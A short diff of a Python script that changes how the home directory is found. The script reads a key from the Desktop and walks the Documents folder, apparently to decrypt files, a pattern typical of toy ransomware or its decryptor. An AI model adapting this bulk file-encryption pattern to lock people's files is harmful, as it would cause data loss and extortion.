@@ -10,8 +10,8 @@ def decrypt(encrypted_data):
     
 
 def main():
-    key = open(os.environ["HOME"] + "\Desktop\key.bin", "rb").read()
-    mypath = r"{}\Documents".format(format(os.environ['HOME']))
+    key = open(os.path.expanduser('~') + "\Desktop\key.bin", "rb").read()
+    mypath = r"{}\Documents".format(os.path.expanduser('~'))
     files = []
     for f in listdir(mypath):
         file = join(mypath, f)
